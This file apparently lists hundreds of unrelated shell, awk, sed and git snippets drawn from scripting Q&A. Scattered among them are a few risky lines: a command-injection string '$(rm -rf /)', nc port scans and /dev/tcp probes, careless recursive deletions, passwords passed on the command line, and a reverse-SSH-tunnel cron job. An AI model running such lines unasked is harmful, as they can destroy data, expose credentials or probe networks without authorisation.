find /Users/Larry/Desktop/modified -type f -maxdepth 1 -name '.csv' -print0 | xargs -0 awk -F '","' {print $2}' find /Users/Larry/Desktop/modified -type f -maxdepth 1 -name '.csv' -print0 | xargs -0 awk -F '"*,*' '{print $2}' > DidItWorkThisTime.csv
> Success.txt
| tee Success.txt
-type d
-type f
Argument lenght exceeded
cut -d',' -f1,2,3 *.csv > result.csv
nc -v -z -w 3 127.0.0.1 5050
nc -v -z -w 3 127.0.0.1 5050 | /dev/null && echo "Online" || echo "Offline"
-w 3
timeout 3 nc -vz 10.18.50.134 23
nc -v -z 10.0.1.1 1-1023
nc -v -z -G 1 10.0.1.1 1-1023
find "$SOURCEFOLDER" -type f -exec bash -c  "sed -e 's/\[[^][]*\]//g' {} ; xargs -I {} ln {} "$ENDFOLDER/$TR_NEW_TORRENT_NAME/${basename}" \;
if [ -n "${emptyvar+1}" ]
System wide and per-user daemon/agent configuration file
init 0
ls -rt *.log
error "ls: cannot access *.log: No such file or directory"
Usage: /etc/init.d/uwsgi {start|stop|reload}
$(id -g "$APPUSER")
cd /home/ankur/folder
IP=( $(sed -n '<SomeThing>' temp) )
sudo visudo
print $0
|| { }
/opt/cisco/anyconnect/bin/vpn connect -s
<< EOM ... EOM
tr -cd '[:print:]'
export LC_ALL=C
while read line
while read line
[[ "$2" != "append" ]] || [[ "$2" != "replace" ]]
[[ "$2" != "append" ]]
[[ $2 == replace ]]
[[ ]]
osascript -e 'tell application "Terminal" to tell window 1 to activate';
"""triple quote"""
sudo supervisorctl start MyConf
chmod +x gunicorn_start.bash
grep command
First    C    9625
Second   B    0238
First C
Second B
tail -n +2
screen -L
mplayer --help
shopt -s lithist
sort -R
grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" <file>
grep -oP "(?<=document\.write\(\')[^']*"
paste -d: - -
gnu awk
NR>1 && !/swaziland/
:set modeline
:set modeline
# !!
man cd
cd -?
which cd
help <name>
man bash
getent ahostsv4 www.google.de | grep STREAM | head -n 1 | cut -d ' ' -f 1
getent ahostsv6 www.google.de | grep STREAM | head -n 1 | cut -d ' ' -f 1
getent hosts google.de | head -n 1 | cut -d ' ' -f 1
cat test-hosts.txt | xargs -i\{\} bash -c 'HOST="{}"; IP=$(getent ahostsv4 "{}" | grep STREAM | head -n 1 | cut -d " " -f 1); ping -c 1 -w 5 "$IP" >/dev/null 2>&1; RESULT="$?"; echo -e "Host: $HOST ($IP) \c"; case "$RESULT" in 0) echo "is online";; 1) echo "not responding after 5 secs";; *) if [[ "$IP" == "" ]]; then echo "has no resolveable address"; else echo "not availabe due to error [$RESULT]"; fi;; esac;'
$SHELL -c 'fc -nl -1 -1'
ksh -c
zip -r MinecraftMods.zip ~/ForgeWorld/mods/
zip -r ~/ForgeWorld/mods/MinecraftMods.zip ~/ForgeWorld/mods/
pdfgrep ... | head -n 1
IFS= read -r line < <(pdfgrep ...) && echo "$line"
-m /--max-count
tail -f
-w 80
! -z
! -z
RS=" "
<title> ... </title>
ls '*.txt' | xargs -i\{\} command "{}" ...
find -maxdepth 1 -type f -name '*.txt' -exec command "{}" ... \;
echo "Testing File: {}"
find . -name '*.txt' -exec bash -c 'CUR_FILE="{}"; echo "Working on: $CUR_FILE"; ls -l "$CUR_FILE";' \;
ls *.txt | xargs -i\{\} bash -c 'TITLE=$(egrep "<title>[^<]*</title>" "{}"); NEW_FNAME=$(echo "$TITLE" | sed -e "s#.*<title>\([^<]*\)</title>.*#\1#"); mv -v "{}" "$NEW_FNAME.txt"'
find . -maxdepth 1 -type f -name '*.txt' -exec bash -c 'TITLE=$(egrep "<title>[^<]*</title>" "{}"); NEW_FNAME=$(echo "$TITLE" | sed -e "s#.*<title>\([^<]*\)</title>.*#\1#"); mv -v "{}" "$NEW_FNAME.txt"' \;
mv 'file_name' 'found_pattern'
my hippo
exit 0
exit 1
| telnet
perl -lne
/for (.+)/; $i=$1;
@f = /var./g
@f = /var\w*/g
&& print "$i @f"
chmod +x banana
ruby foo
cd / && ls
Edit > Keyboard shortcuts
pv foo.img > bar.img
shell prompt
and more
more text
exec 3<> /dev/tcp/host/port
No such file or directory
/bin/bash --login
!/bin/bash --login
rails server
rails generate
gnu awk
echo $?
read -p x < /dev/tty
read -r
some instructions
some instructions
if [ "$id" == "" ] || [ "$job" == "" ]
sleep 5
echo $HOST
[[ "$HOST" =~ ^#.*$ ]] && continue
sed -ne 's/^\([a-f0-9]*\)$/\1/p' file
sed -ne 's/^\([a-f0-9]*\)$/\1/p' file
sed -n '/pattern/p'
printf "%f" 0xNUMBER
printf ... >/dev/null 2>&1 && echo "$line"
test_condition && ... || ...
ls /bin/[
set -xv
[ ... ]
[ ... ]
set -xv
set +xv
exec 3<>/dev/tcp/192.0.2.1/80
echo > /dev/udp/192.0.2.1/53
make: Nothing to be done for 'default.
$(shell ...)
$(shell ... )
find -exec
unexport variable
export variable
export variable-assignment
unexport variable
Tell make whether or not to export a particular variable to child processes
sed "s/foo/bar/g" file_in > file_out
Mail Delivery Status Report will be mailed to <me>.
echo $REP
add directory
creat directory
{ ... }
/$name/I {p;d};
index($0, name)
$0 ~ name
-v name="$name"
if (p) exit
if (index($0, name))
index() returns the 1-based position at which the substring was found, which is interpreted as
in a Boolean context), sets flag
man isspace
-v IGNORECASE=1
index($0, name)
-v RS='(^|\n)ip'
index($1, name)
-v IGNORECASE=1
sub(/\n$/, "")
print "ip" $0
echo "header phantom" | sed '/^header/!{H;$!d};x' realdata.txt -
{ showgroups; echo header phantom; } | sed '/^header/!{H;$!d};x'
sed '/DOG/, /^ip/ !d' | sed '$d'
perl -ne ' /^\w+/ && {$p=0}; /DOG/ && {$p=1}; $p && {print}'
perl -pne
push @{$l[($.-1) % 3]}, $_;
}{ print "@$_" for @l
| column -t
{ "sh", "-c", "ps $0", "aux", NULL }
echo $response
tail -c
uniq -c
grep -P
listen = /var/run/php5-fpm.sock
a[$1 " " $2] += $3 ; b[$1 " " $2] += $4
export PATH=/usr/local/bin
command not found
env -i bash --norc
-G globpat
-W wordlist
exit 1
TMPDIR=new/path make
make TMPDIR=new/path
tr -d $'\n' passphrase.txt
COMMIT_SHA = "$COMMIT_SHA"
awk '{print substr($4,index($4,"www")+4,index($4,".com")-index($4,"www"))} 'data.log >> data.json
'<value of $dir>/*.jar'
set -f
shopt -so noglob
shopt -s nullglob
shopt -s failglob
{ shopt -o; shopt; } | fgrep glob
man bash
shopt -s nullglob
wc -c
shopt -s failglob
set -e
|| <command in case of failure>
$(shopt -s nullglob; echo $glob)
[[ ... ]]
shopt -s nullglob
No such file or directory
[ $(wc -l < file) -gt 3 ]
tail -4 file | head -1
tail -5 file | head -1
sort file | uniq
tail -r
cut -f1 -d:
echo "Study Instance UID has been found!!"
$scale="-vf scale..."
-vf scale
echo "BBB"
printf "BBB\nAAA\n"
which python
python 3.4
pip3 install django
python 2.7
pip install django
python 3.4
in your shell
which -a python
export path="/usr/local/bin:$path"
source .bashrc
which python
cpio -d
Script started
Script done
-v var=value
"Blood, sweat and tears"
"""My goodness,"" she said"
sort -n $PWD/this_is_my_file -o tmp
head -n 2
tail -n +3
find yout/path/*.jpg  -type f -mmin +10 -exec rm {} \;
-type f
grep -v
mvn versions:set -DnewVersion=14.7.1-SNAPSHOT
[[ ... ]]
read -n1
non printable
man 7 regex
man 7 re_format
Avinash Raj
ed, more, and vi
/usr/local/bin to /common/bin
Replace all matches, not just the first match.
Delete the pattern space; immediately start next cycle.
This option specifies that files are to be edited in-place. GNU sed does this by creating a temporary file and sending output to this file rather than to the standard output.
grep -v
hostname -f
man curl
ping -c2
[[ $? -eq 0 ]]
[ -n ${site} ]
[ ! -z ${site} ]
[[  ]]
[ ]
test -n "${site}"
--max-time <seconds>
./test FOO BARG foobar
BARG not matched.
rm -ri
trap DEBUG
netstat >> output.txt
ruby file.rb
tail -n 1 [logfile]
| cap
Preferences -> Shortcuts -> Select all
bash  -c '/bin/sleep 0.3 ; xdotool key ctrl+shift+a ; xdotool key ctrl+shift+c ; ( (xclip -out  | ${HOME}/parse.rb ) > /tmp/clipboard ) ; (cat /tmp/clipboard | xclip -sel clip ) ; xdotool key ctrl+shift+v   '
Run command as login shell
m_100, m_1005, m_10005
directory 2
1_m, 1000_m
sed -r
sed -E
cAND[ ]*
(?=[ ]*(?:c.|\(p))
cAND text2 c.1069G>A (p
-maxdepth 1
-type d
tail file > newFile
-O nomefile
wget https://github.com/liquibase/liquibase/releases/download/v3.8.1/liquibase-3.8.1.tar.gz
bash script.sh
let o++
for ((o = 0; o < 3; o++))
set +e
echo $SHELL
echo $PATH
. B
. A
. B
. A
bash -posix
. B
. A
. B
. B
bash -posix
. B
echo 'abc' | sed  -f myScript -e 's/c/C/' # -> 'ABC'
-f /dev/stdin
-f -
shopt -s extglob
-f -
-v RS='^$'
-v ORS=
select... do
key = value\n
$(foo=bar;echo $foo)
Intra TAU success Times(SGW not change)
[Intra TAU success Times(SGW not change)]
STRING="(Intra TAU success Times(SGW not change) + Intra TAU success Times(SGW change) + Period TAU success Times(SGW not change)+ Period TAU success Times(SGW change))/(Intra TAU request Times(SGW not change) + Intra TAU request Times(SGW change)+ Period TAU request Times(SGW not change)+ Period TAU request Times(SGW change)) x 100%"
//Development/graphic/release/Unity Provider
adb shell "… echo $L; …
adb shell
crontab -e
xl list
3 4
egrep,tr and cut
xl list
echo $id
exec 3<>/dev/udp/10.10.10.1/161
cat head body | tee body
12 directories
12 directories
13 directories
find . -type f | wc -l
tree -idf --noreport | while read line ; do echo $line ; find $line -maxdepth 1 -type f | wc -l ; done
grep -F
perl -lne '/wireless/ && /driver=(.*?)\s/ && print $1'
nss_base_passwd         ou=People,dc=ca,dc=somecompany,dc=com?one?|(description=TD_FI)(description=TD_F6)(description=TD_F6)(description=TRI_142)(description=14_142)(description=REX5)(description=REX5)(description=1950)*
sort -u
[[ $s <= 00 ]]
git lg
timeout --help
grep "<id>ossrh</id>" ~/.m2/settings.xml
perl -v
built for MSWin32
Caps Lock
Caps Lock
man tput
man terminfo
"error device not found"
data = urllib2.urlopen(full_url)
du -h
du -h
tar -tjf foo.tar.bz2
sudo apt-get install wmctrl
send -- "find /local/$SIGN/ -maxdepth 1 -type d -mtime +30 |xargs rm -rfv\r"
send -- "find /local/${SIGN}/ -maxdepth 1 -type d -mtime +30 |xargs rm -rfv\r"
[ ... ]
[ .. ]
chmod: cannot access ‘/dev/ttyUSB0’: No such file or directory
ser=serial.Serial('/dev/ttyUSB1',115200, timeout=1)
[[ "$(echo foo | md5sum)" =~ $(echo '^d3b07384d113edec49eaa6238ad5ff00\b') ]] && echo ok
delete b[$1]
($1 in b)
!($1 in b)
awk '{print $2 }' ORS=' '
>(whiptail ...)
> >(...)
ssh $SSH_HOSTNAME
bash: 7986: command not found
perlop Quote-Like Operators
[[ ]]
$( )
TMPDIR="$(pwd)/$(dirname "$0")"
echo "$input"
IFS= read
echo -n
sudo chown -R $USER:admin /system
sudo chown -R $USER:admin /system
Disk Utility
less -- +1
! exp exp2
(! exp) AND (exp2)
find -mindepth 1 (-type f AND -name 'a') OR (-name 'b')
find -mindepth 1 (-type f) AND ( -name 'a' OR -name 'b')
find . -type d -mmin +5 \! -empty \( ! -iname ".*" \) | wc -l
find . -type d -mmin +5 \! -empty \! -iname ".*"  | wc -l
find . (-type d) AND (-mmin +5) AND (! -empty) AND (! -iname ".*") | wc -l
while IFS= read -r -d''
su_wrapper foo bar baz
su -c "foo bar baz"
su -c 'bash -c "$@"'
local IFS=' '
printf "%q"
bitcoin getinfo
./compile next/123/file.txt
binary array=1024x1024
binary array=128x128
plot binary array
somecmd arg1 arg2 > ~/Deskto
complete -r yourcommand
[ -f $input ]
bash -c
pidstat -c "dd" -p ALL
top -d 0.2
91 bytes -> 92 bytes
$2 == "bytes"
a[$1] != NR
$(date +"%d-%m-%Y");
date +"%m-%d-%Y"
OS X
OS X
export PATH="... cleaned up path ..."
grep -c
grep -o
wc -l
grep -oc
grep -c
grep -o o | wc -l
<img-name>-<width:integer>x<height:integer>.<file-ext> syntax
-name "*.*"
-type f
-exec grep -l '<img-name>-<width:integer>x<height:integer>.<file-ext> syntax' {}
xargs rm -f
if ... elif ... else
printf %q
[[ $? -eq 0 ]]
mongo --eval 'var databasePassword="password"' script.js
db.auth({ user: 'testUser, pwd: databasePassword });
[ $check -gt 10000 ]
check = $(du -sb /home/chris/Dropbox/VideoMonitor | cut -f1)
rm: missing operand
find -mtime +N
cd back. With
you tell bash to do set the current directory where
gpg: cannot open tty /dev/tty: No such device or address
M-x report-emacs-bug
perl -pe 's/[^[:print:]]//g'
-f UTF8
-t UTF8
iconv -l
perl -pe
pip freeze
-r shared.txt
Blablalbla. >m01:1
echo $GOPATH
locate /bin/go
sudo /usr/libexec/locate.updatedb
$(uuidgen -r | grep -o "\w\{12\}" | tr '[:lower:]' '[:upper:]')
$(uuidgen -r | grep -o "\w\{12\}" | tr '[:lower:]' '[:upper:]') {}-id.jpg
wid=$(uuidgen -r | grep -o "\w\{12\}" | tr '[:lower:]' '[:upper:]') $wid.jpg
(eshell/echo "$?")
[ "$cpanel" = "$cpanelstate" ]
cpsrvd (pid  10066) is running...
[[ ... ]]
[ ... ]
[[ "$cpanel" == *"$cpanelstate" ]]
alias echo='/bin/echo ==\> $*'
open -h {header}
open -h
open -h ...
sudo apt-get install python-pandas
<TH bgcolor=#7070ff>DATAbase</th>
<TH and >
<TH> DATAbase </th>
<TH bgcolor=#7070ff>
[[ ! $ch =~ [Yy] ]]
exit $exitstatus
remote: sed: can't read /App/abc/TestFile.java:No such file or directory
git write-tree
git write-tree
git diff
git diff
git write-tree
git add
git add -p
git show
git push
git rev-list
git show
git diff "$old_commit"..."$latest_commit"
$ sudo vi /etc/modprobe.d/raspi-blacklist.conf
do echo "F"$i > File$i
set -o errexit
echo foo,echo bar
foo,echo bar
`cat list`
while read; do ...; done < list
declare -p
declare -g
eval "$2=()"
for (i in a)
print i,a[i]
if [ 0 ]
if [ 1 ]
while :; do
history | tail -n 1 | pbcopy
1968* mv ~/iPhoto\ Library.zip ./ ; bell
fc -l
man 1 bash
date -s
man mpirun
echo $PATH
echo $JAVA_HOME
#define INCLUDE_SOMETHING
s/^/#define /g
s/=/ /
awk -F "=" '{print "#define",$1,$2}' <<< "$1"
cat /root/pid
ps aux | grep "python" | grep -v grep | awk '{print $2}'
svn log
--limit 1
flock: bad number: myfilelock
( )
{ }
readlink -f
python manage.py syncdb
python manage.py sql myproject
git status
git status
scp weirdbox:
"123" + "b"
printf "%-42s"
/dn: cn=Configuration/!d
dn: cn=Configuration
dn: cn=Configuration
dn: cn=Configuration
2013.11.12 14:11:00 CET
awk: i/o error occurred on /dev/stdin
cat temp_file.txt
[ $exit_code -eq 0 ]
exit $exit_code
cat /tmp/data | awk '{"date -d \"" $1 " " $2 "\" +%s"|getline secs; print secs, $0}'
cat /tmp/data | awk '{"date -d \"" last_ts "\" +%s"|getline mindate; "date -d \"" $1 " " $2 "\" +%s"|getline secs; if (secs > mindate) print $0}'
cmd|getline var
[foo] bar [baz] foo
[foo] [bar]
[foo] bar [baz]
Runtime.getRuntime.exec(String command)
StringUtils.join(cmdarray, ' ')
' '
listen = 1.1.1.1
listen = 2.2.2.2
tail -f
<Item name>: <avg temp> (<temp 1>, <temp 2>, <temp 3>)
-v itm='BATTERY'
$0 ~ itm
vals = ...
(i ? " " : "")
sum += ...
sum / i
systemctl list-unit-files --type service
systemctl list-unit-files --type service | awk {'print $1'} | awk -F. {'print $1'} 
systemctl is-active $service
systemctl --all --type service
systemctl start pure-ftpd
systemctl --all --type service
systemctl status
systemctl status
2> /dev/null
function fail {
use database
killall vim
ls -Q
(( and ))
awk: command not found
python script1.py | python script2.py
python script1.py | python script2.py
man bash
PID=20168; sudo docker ps --no-trunc | grep $(cat /proc/$PID/cgroup | grep -oE '[0-9a-f]{64}' | head -1) | sed 's/^.* //'
cat Filename.txt|awk -f ' ' '{print $2,$4,$5}'
can't open source file ' '
' '
foo="1 2 6"
if perform_test "sthg" ; then
return 1
gracebat -nosafe data.dat -batch script.bat
-batch <script>
"Hello World"
delete from X.Y
sed 's/delete from .*\./delete from /' a.txt
sed -i 's/delete from .*\./delete from /' a.txt
(eval "$cmd";echo $?   > $exitfile)
exec 2<&- and exec 2>$stderrfile
test.sh: line 3: 32323 Terminated              ( eval "$cmd"; echo $? > $exitfile )
retry "some_command_or_function arg1 arg2 .." 5 2 10
kill -15 5168
endlessloop terminated
kill -9
man timeout
java CmdArgsTest s*
-i a.i
sed 's/\(.*(\)\([0-9][0-9]*).mp3\)/\10\2/'
name - 1
sed 's/sub\.domain\.com/anotherdomain\.com/1'
sed -E
perl -pe '/(http|https):\/\/(.*?)(\/|$)/ && s/$2/anotherdomain/g'
perl -lpe 's/[^[:print:]]//g'
perl -e 'for($i=0; $i<=255; $i++){print chr($i);}'
cat -A
perl -lpe 's/[^[:print:]]//g'
grep -iv "home" /etc/passwd >~/nostdhome.txt
chmod +x valid.pl
./valid.pl filename
$(cat file)
Each entry must be separated by a newline character.
LOAD DATA INFILE
INSERT ...SELECT ...ON DUPLICATE KEY UPDATE
LOAD DATA INFILE
LOAD DATA INFILE
LOAD DATA INFILE
INSERT...ON DUPLICATE UPDATE...
LOAD DATA INFILE
INSERT...SELECT...ON DUPLICATE KEY UPDATE
echo "Please enter a valid number"
unset IFS
IFS=$'\t\n '
scp -p
rsync -t
wget --timestamping
(( ))
diff -u
git pull
php myscript.php
N = 3
grep -o '...$'
mysqldump -t -u root -p dbname table1 table2 table3 table4 table5 table6 -w"Status = 'N'" >/backup/test.sql;
mount |grep -q "abc"
[ 0 ]
[ 1 ]
if [ 1 ]
test 0
[ 0 ]
test 1
command 1 "ab"
command 3 "ab"
ascii code+1
./updateDB.sh Aa
[  status != isrunning ]
unary operator expected
grep "inet addr:${IP} "
ip addr
./myscript.sh ../Napster.app/it.lproj
./myscript.sh ../Napster.app
[#]: not found
[80-254-70-241]myusername @ ~ $
export PS1="\[\033[32m\][\h]\u @ \W \$\[\033[0m\]
hexdump -C
chmod +x mycommand
(){objcopy -O binary -j .text <input file> $1; cat $1} =(touch -c .) | hexdump -C
=(touch -c .)
touch -c .
touch -c .
#do something
ls -l foo
perl -pe 's/<regex>/<substitution>/' file
echo foo $a
syntax error near unexpected token '('
ls -a
1/1/1970 00:00:00+000
1 .. 12
sed -i
sudo -v
sudo -k
GDB, x/10xw Address
repeat count
x/($var)xw Address
${@: -1}
kill -9 %1
./script.sh input.cpp
./script.sh input.cpp functions.cpp
! exp
crontab -e
chmod 0755 filetest.sh
crontab -e
<tr class="active">
sed -i
${var:?var is empty or unset}
${var?var is unset}
xcodebuild -scheme target1 clean;
echo $PATH
read -a
ls -la
-bash: /Users/Username/git-completion.bash: No such file or directory
sese rere baba
cat textfile.ext | tr -d '\n'
cat textfile.ext | grep -A1 '^<p>Some text' | tr -d '\n'
man grep
grep -A1 '($'
<?php phpinfo(); ?>
(sudo command) &
sudo (command &)
sudo -b
git show
git cat-file
:set paste
:set nopaste
sshpass -p your_password
Charles Duffy
Cannot rename: $file and $file is the same file.
awk -f /home/rkahil/BMS/parse.awk $filename.tmp > $filename | /..,[A-Z][A-Z]/ $filename
/..,[A-Z][A-Z]/ $filename
xxd -b
tr -d "[:cntrl:]"
/M2\{/ .. /\}/
$str =~ /M2\{.*?(Freq: .*?\s)
runavg.sh file1 file2 file2
echo $jbod4
./myscript.sh -o:1,2,3,4
./myscript.sh -e:2,3,4
./myscript.sh -o:1,2,3,4
./myscript.sh -e:2,3,4
./myscript.sh -e:1,2,3,4
./myscript.sh -o:2,3,4
set -e
set -e
set +e
set -e
set -o
set -e
set -e
set -e
set -e
set -e
return 0
set -e
trap 'echo Error $? on line $LINENO; trap - ERR; return 2>/dev/null || exit' ERR
awk 'a[$0]++' file
rm -f
foo 5
client 15 jenkins
*" "*[0-9]*
*[0-9]*" "*
service test stopexitservice test stopart
cd ..logs[1Pls -al
perl -ne 's/\x1b[[()=][;?0-9]*[0-9A-Za-z]?//g;s/\r//g;s/\007//g;print' < screenlog.0
diff -qr a b
diff -qr a b
find a
find b
sed 's/^[^/]\+//'
okesh: command not found
help if
if [ "a" == "a" ]
if [ "a" = "a" ]
echo $(( $RANDOM % 12 ))
chmod +x myscript.sh
sed -n 1p listofurls.txt
lynx -dump www.firsturl...
sed -ne 's/^cpu\(.*\) .*/\1/p' /proc/stat
(( ))
Shell != Bash
#echo ${BASH_REMATCH}
grep -o
grep -o
; then
if [ ... ]
ldd xattr
ls -a
ls -a ~
cd ..
$( ... )
'single quotes'
"double quotes"
(?=\s*:(?:(?!^\S).)*?Groundhog Day)
Groundhog Day
movie 3
grep -P
$source /c/Python27/Scripts/virtualenvwrapper.sh
C:\python27\;C:\python27\scripts\;C:\python27\scripts\virtualenvwrapper.sh\;C:\msys;C:\Program Files (x86)\Git\cmd;C:\Program Files (x86)\Git\bin\
nexus 7
LAUNCH SUCCESS
(size name)
(( max_size < size )) && (( max_size=size ))
(( **length=cols** * file_sizes[$k] / max_size ))
(( max_size < size )) && (( max_size=size ))
(( length=cols * file_sizes[$k] / max_size ))
man sort
phantomjs example.js
phantomjs script.js > log 2>&1 < /dev/null &
< /dev/null
trap __cleanup EXIT
-S jcmp
-X stuff
sudo service apache2 reload
sudo service apache restart
sudo /home/quaser/restart-apache.sh
Defaults requiretty
cmd1 && cmd2;
alias myalias="myprogram $(pwd)"
cd thisfile
syntax on
sh -c 'rm -rf $(dirname $0)' {}
sh -c
rm -rf $(dirname $0)
./the_example.sh 1 2 3
Framework Code Note 10(X).txt
printf "%s\n" "/path/to/downloads/Framework Code Note $1"*.txt
Framework Code Note 10(X).txt
Framework Code Note 10.txt
sort -nr -t '(' -k 2
k 2
-t '('
Framework Code Note 10.txt
" />
i(x, min(y))
ls f* | xargs -I{} sed 1d {}
.script.sh /example/test/
tr -d '[:alnum:]\/'
if ($i == "")
No such file or directory
sed -i
find|while read
while read
DS:speed:GAUGE:60:-10:50: command not found
cat -A
cat -A  makedb.sh
env|grep -i ssh
keychain --list
grep -c 'string' dir
-exec cat
grep -c string
-maxdepth 1
./test21 testfile1.txt
./test21 testfile1.txt
BSD ps
watch -n {{seconds}} {{your-command}}
sbatch myscript.sh
sbatch -n $numProcs myscript.sh
aws elb describe-instance-health --load-balancer-name
export AWS_CONFIG_FILE=/home/ubuntu/.aws/config
export PATH=/usr/local/bin:$PATH
Permission Denied
Unable to create file/folder
<td abbr="fileOne">(.*)</td>
sleep 1
ls a
a1 a2 a3
build path/to/dir/
build listtargets
mybuild a_target
build my/project/directory/a_target
a 1
printf -v
LC_ALL=C sar -A -f /var/log/sa/sa05 >> /tmp/sar.data3.txt
LC_ALL=C sar -A -f /var/log/sa/sa* >> /tmp/sar.data3.txt
if [[ ! "$t1" == "$artist" && ! "$t1" == "$album" ]] ; then
pcregrep -M
echo $lineNumbers
<strong>21. Infinite Safari Balls</strong>
hg log -r "(date("$startdate to $enddate"))"
timeout 1 bash -c 'cat < /dev/null > /dev/tcp/$HOST/$i' && echo $?
$ bash myscript
-v option
-v info
-v warning
-v error
man bash
out, _ = p.communicate()
source ~/.profile
grep -l
grin -l
('s/\(<test name=\"NAME\"\) value=\"VALUE\"/\1 value=\"YourValue\"/I')
gnu sed
-v RS='\n\t+'
-v ORS=@
sed '$d'
git clone
git push origin master
git push origin master
git init
git remote add origin https:/github.com/kobosh/everyonehub
while read j; do
done <java_file_names.txt
aws configure
sed '/^#/d'
sed '/^$/d'
process substitution
BASH array
wc -l * | grep  -v "14" | rm -rf
imap jj <ESC>
imap kk <TAB>
docker run
docker run
docker ps
docker run
docker inspect
docker inspect
sleep 1
docker exec $id true 2>/dev/null || echo not running
root privileges
su root
Updating for clarity:
date +%s
date +%s
date +%s
date +%s
date +%s
date -u +%s
1970-01-01 00:00:00 UTC
alias utc='date -u && date -u +%s'
set -xv
su tomcat7
su tomcat7
more /etc/passwd
docker exec
apt install sudo
sudo -i -u tomcat
ls -al
ls -al
ls -1 | wc -l
mix release
rel/qpidpn/bin/qpidpn start
rel/qpidpn/bin/qpidpn remote_console
-f 7
-mmin +5
find -name "pattern"
[]') match a
find -name "pattern"
tail -F
grep -B
sudo apt-get install mosquitto
sudo service mosquitto stop
sudo service mosquitto start
allow_anonymous true
listener 1883 0.0.0.0
$ sudo service mosquitto restart
$ mosquitto --verbose --config-file /etc/mosquitto/conf.d/mosquitto.conf
ip -color addr
sed -ne "s/${goterm}/pi/gp" GOEA.csv
grep -w
set -x
git pull
echo "username" | git pull
count=1;echo "Hello Bash"| cut -d" " -f$count
echo "Hello Bash"| cut -d" " -f1
${ADDR[ ]}: bad substitution
Popen(['bash', '-c', 'echo "$USER"'], ...)
Popen("echo $USER", shell=True)
~/Desktop/out.txt: No such file or directory.
sort -m -k 1
gunzip -c FILE.gz
path/to/my-script start
/bin/sh: start command not found
path/to/my-script sbt start
grep -P
exec('php composer.phar install -d ' . dirname(__DIR__), $out);
echo ${MYARRAY[0]}
-v -v -v -v
your_command grid_20[01][0-9][01][0-9].grb2.nc
sudo -E
/etc/network/interfaces with
sudo PYTHONPATH=/home/user/scripts ifdown eth1
PYTHONPATH=/home/user/scripts /usr/local/myscripts/pre_down.py
Debian 7
hostname -f
host ${!#}
%s", `whoami`, "
gnu sed
non-gnu sed
echo $PATH
source .cshrc
-v l="$line" -v l="$EXITCODE"
while do done
Here Strings
script "hello 12345 xyz"
a.sh: 5: a.sh: line1: not found
wget --help
while read
sed -i '1,7 s/.*//g' geometry.xyz
with administrator privileges
mv $i ${i%.*}_3.6.14.png
ls | sed -E "s/(.*)\.png$/\1_foo\.png/
ls | sed -E "p;s/(.*)\.png/\1_foo\.png/" | xargs -n2 mv
$0, $1, etc.
piping + xargs + bash -c
time ./a.out
man time
gnu awk
/usr/cti/conf/apps/parameters  param1 param2
1,LINUX,"/usr/cti/conf/apps/parameters  param1 param2","root passowrd"
"/usr/cti/conf/apps/parameters  param1 param2"
cat $processedFile | sed "s/^(.{134})/\1;/g" | sed "s/^(.{148})/\1;/g >> $outFile
numeric arg required
set -e
printf "%s\n" s/\.cgi\?key/\.cgikey/g
find <top-directory>  -name '*.class' -exec locate {} > location.txt  \;
chmod +x my_script.sh
command not found
source /usr/local/bin/virtualenvwrapper.sh
source /usr/local/bin/virtualenvwrapper.sh
[[ -e ~/.bashrc ]] && . ~/.bashrc
EXPORT JAVA_HOME="whatever"
$ source ~/.zshrc
adduser bob
adduser: Only one or two names allowed.
./script -a -s 10
echo check_ifrunning is $check_ifrunning
grep -q
%users ALL=(root) /usr/bin/find
%admin ALL=(ALL) ALL
make -j N
echo "TEXT $f1 TEXT" > systemFile
sudo sh -c 'echo "TEXT '$f1' TEXT" > systemFile'
export f1
sudo -E sh -c 'echo "TEXT $f1 TEXT" > systemFile'
man sudo
man logger
ls -l $(which sh)
<%= ENV["EXAMPLE_VARIABLE"] %>
rc == run control when bash load
chmod +x script.sh
cat -vet
paste -d, /temporary_directory/*.csv >> /final_destination/X.csv
s/^ *//;
s/ *$//;
s/ \{1,\}/ /g;
s/-\{1,\} /-/g;
s/ -/\t-/g
read -s
stty -a
cat -v
[ 4]
gnu awk
awk -F'^\\[ *[0-9]+\\] | +' '{printf "%-24s %-8s %-6s %-6s\n", $2, $4, $5, $6}' file
git pull
git fetch
[ -f *.$1.*.ext ]
[[ -f *.$1.*.ext ]]
[[ `ls *.$1.*.ext` ]]
[[ -f `ls -U *.$1.*.ext` ]]
[ -f ... ]
[[ -f ... ]]
shopt -s nullglob
set -- ...
echo $#
[ ... ]
[[ ... ]]
[[ ...  ]]
[ ... ]
[ ... ]
kill $!
kill $!
man bash
{ list; }
[ -e ]
fatal: https://github.com/ipython/ipython/pull/4195/info/refs?service=git-upload-pack not found: did you run git update-server-info on the server?
./sage -i http://sage.math.washington.edu/home/jason/sagecell-spkg/sagecell-2014-03-01.spkg
10 bits
owner group world
ls -al /home
NOTE: with a directory, the execute bit also control whether the (owner, group or world) can descend into the directory
chown david:samba filename
bash -x
bash -c
set --
cherry-pick && merge
commit --amend --author
commit --amend --author
git log
A <A@A>
A <A@A>
B <B@B>
git cherry-pick
git cherry-pick -n
git commit
B <B@B>
B <B@B>
A <A@A>
git merge --squash
A <A@A>
B <B@B>
A <A@A>
git push
git commit --amend
git rebase
A <A@A>
B <B@B>
git rm -r .; git checkout $rev -- .
git rev-list
git checkout
21613@23151811.co.za = fun@work.co.za
21613. 23151811.co.za
21 16 13=  F=21 U=6 N=14
17 12 25= J= 17 O=12 B=25
171225.13916.co.za = job.mip.co.za
IFS=$'\n' read -ra array <<< "$names"
null byte
read -r
grep -rn "IFS"
hostname -i
$(hostname -i)
netstat -ntp | grep ":22"
ss -ntp | grep ":22"
crontab -e
1 * * * * /path_to_my_script/maintain_reverse_ssh_tunnel.sh
chmod 755 maintain_reverse_ssh_tunnel.sh
source ~/.bash_aliases
. .bash_aliases
source ~/.bash_aliases
source ~/.bash_aliases
readlink -f
readlink -m
bundle exec
exec bash -l /path/to/real-script.sh
0 16 * * * /bin/bash -l '/home/backup/scripts/gitlabBackUp.sh'
/usr/local/bin/bundle exec /usr/binrake gitlab:backup:create --trace RAILS_ENV=production
which bundle
which rake
type -P bundle
type -P rake
name="test 2"
[ ~/LINKEDDIR ]
[ /var/etc/bin/the/actual/path ]
git pull
git pull
uptime | awk -F'[a-z]:' '{ print $2}'
rsync --max-size=4000000000
tar -cz
ls -l foo.txt/..namedfork/rsrc
| yourprogram
> file
sudo su
sudo su
[[ ... ]]
[ ... ]
bash -c
su -c
su -c
sudo -s
sudo su
sudo -s
A="echo test; ls"
foo='$(rm -rf /)'
printf %q
bash -c "$cmd_str"
[ and ]
